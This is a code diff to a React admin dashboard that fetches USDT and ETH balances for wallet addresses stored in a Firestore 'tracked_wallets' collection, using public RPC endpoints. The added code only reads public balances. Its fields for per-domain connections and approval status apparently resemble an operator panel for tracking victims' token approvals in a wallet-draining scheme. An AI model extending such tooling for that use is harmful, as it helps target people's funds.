@@ -1,29 +1,97 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { collection, onSnapshot } from 'firebase/firestore';
 import { db } from '../../config/firebase';
 
+// USDT contract on Ethereum mainnet
+const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const RPC_ENDPOINTS = [
+  'https://cloudflare-eth.com',
+  'https://rpc.ankr.com/eth',
+  'https://eth.llamarpc.com',
+  'https://1rpc.io/eth',
+];
+
+// Raw JSON-RPC call with fallback across multiple endpoints
+async function rpcCall(method, params) {
+  for (const url of RPC_ENDPOINTS) {
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
+      });
+      const json = await res.json();
+      if (json.result) return json.result;
+    } catch (_) {}
+  }
+  return null;
+}
+
+// Fetch USDT balance for a single address — no wallet needed, just address
+async function fetchUsdtBalance(address) {
+  try {
+    const addr = address.toLowerCase().replace(/^0x/, '').padStart(64, '0');
+    const data = '0x70a08231' + addr;
+    const hex = await rpcCall('eth_call', [{ to: USDT_CONTRACT, data }, 'latest']);
+    if (hex && hex !== '0x' && hex !== '0x0') {
+      return Number(BigInt(hex)) / 1e6; // USDT has 6 decimals on ETH
+    }
+  } catch (e) {
+    console.warn(`USDT fetch failed for ${address}:`, e);
+  }
+  return 0;
+}
+
+// Fetch native ETH balance
+async function fetchEthBalance(address) {
+  try {
+    const hex = await rpcCall('eth_getBalance', [address.toLowerCase(), 'latest']);
+    if (hex) return Number(BigInt(hex)) / 1e18;
+  } catch (e) {
+    console.warn(`ETH fetch failed for ${address}:`, e);
+  }
+  return 0;
+}
+
 export default function WalletDashboard() {
   const [wallets, setWallets] = useState([]);
+  const [balances, setBalances] = useState({}); // { address: { usdt, eth } }
   const [loading, setLoading] = useState(true);
+  const [balanceLoading, setBalanceLoading] = useState(false);
   const [error, setError] = useState(null);
   const [search, setSearch] = useState('');
   const [domainFilter, setDomainFilter] = useState('');
 
+  // Fetch balances for all addresses directly from chain
+  const fetchAllBalances = useCallback(async (walletList) => {
+    if (!walletList.length) return;
+    setBalanceLoading(true);
+    const results = {};
+    await Promise.all(
+      walletList.map(async (w) => {
+        if (!w.address) return;
+        const [usdt, eth] = await Promise.all([
+          fetchUsdtBalance(w.address),
+          fetchEthBalance(w.address),
+        ]);
+        results[w.address.toLowerCase()] = { usdt, eth };
+      })
+    );
+    setBalances(results);
+    setBalanceLoading(false);
+  }, []);
+
   useEffect(() => {
-    // No orderBy here — it requires a Firestore composite index.
-    // We fetch all docs and sort client-side instead.
     const unsubscribe = onSnapshot(collection(db, "tracked_wallets"), (snapshot) => {
       const docs = [];
       snapshot.forEach((doc) => {
         docs.push({ id: doc.id, ...doc.data() });
       });
-      // Sort by lastUpdated descending (newest first), client-side
       docs.sort((a, b) => {
         const aTime = a.lastUpdated?.toMillis?.() ?? 0;
         const bTime = b.lastUpdated?.toMillis?.() ?? 0;
         return bTime - aTime;
       });
-      // Deduplicate by address — keep only the most recent entry per wallet
       const seen = new Set();
       const unique = docs.filter(w => {
         if (!w.address || seen.has(w.address)) return false;
@@ -33,6 +101,8 @@ export default function WalletDashboard() {
       setWallets(unique);
       setError(null);
       setLoading(false);
+      // Auto-fetch balances when wallets load
+      fetchAllBalances(unique);
     }, (err) => {
       console.error("Error fetching wallets:", err);
       setError(err.message || 'Failed to load wallets from Firestore.');
@@ -40,10 +110,11 @@ export default function WalletDashboard() {
     });
 
     return () => unsubscribe();
-  }, []);
+  }, [fetchAllBalances]);
 
   const handleRefresh = () => {
     setLoading(true);
+    fetchAllBalances(wallets);
     setTimeout(() => setLoading(false), 800);
   };
 
@@ -52,7 +123,6 @@ export default function WalletDashboard() {
   const pending = wallets.filter(w => w.approval === 'Pending').length;
   const approvalRate = totalConnections > 0 ? Math.round((approved / totalConnections) * 100) : 0;
 
-  // Extract unique domains for the dropdown
   const uniqueDomains = [...new Set(wallets.map(w => w.domain).filter(Boolean))];
 
   const filteredWallets = wallets.filter(w => {
@@ -63,6 +133,12 @@ export default function WalletDashboard() {
     const matchesDomain = domainFilter === '' || w.domain === domainFilter;
     return matchesSearch && matchesDomain;
   });
+
+  // Helper to get balance for an address
+  const getBalance = (address) => {
+    if (!address) return { usdt: 0, eth: 0 };
+    return balances[address.toLowerCase()] || { usdt: 0, eth: 0 };
+  };
 
   return (
     <>
@@ -78,7 +154,7 @@ export default function WalletDashboard() {
           <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className={loading ? 'spinning' : ''}>
             <path d="M13.65 2.35A7.96 7.96 0 0 0 8 0C3.58 0 0 3.58 0 8s3.58 8 8 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 8 14 6 6 0 1 1 8 2c1.66 0 3.14.69 4.22 1.78L9 7h7V0l-2.35 2.35z" fill="currentColor"/>
           </svg>
-          {loading ? 'Syncing…' : 'Sync'}
+          {loading ? 'Syncing…' : balanceLoading ? 'Fetching…' : 'Sync'}
         </button>
       </header>
 
@@ -190,6 +266,7 @@ export default function WalletDashboard() {
                 const connectedAt = wallet.lastUpdated?.toDate
                   ? wallet.lastUpdated.toDate().toLocaleString()
                   : '—';
+                const bal = getBalance(wallet.address);
 
                 return (
                   <tr key={wallet.id} className="admin-row">
@@ -224,8 +301,8 @@ export default function WalletDashboard() {
                     </td>
                     <td className="admin-td admin-td--balance">
                       <div className="admin-balance">
-                        <span className="admin-balance__usdt">{wallet.usdt || '0.00'} USDT</span>
-                        <span className="admin-balance__native">{wallet.native || '0.0000'} ETH</span>
+                        <span className="admin-balance__usdt">{bal.usdt} USDT</span>
+                        <span className="admin-balance__native">{bal.eth} ETH</span>
                       </div>
                     </td>
                   </tr>
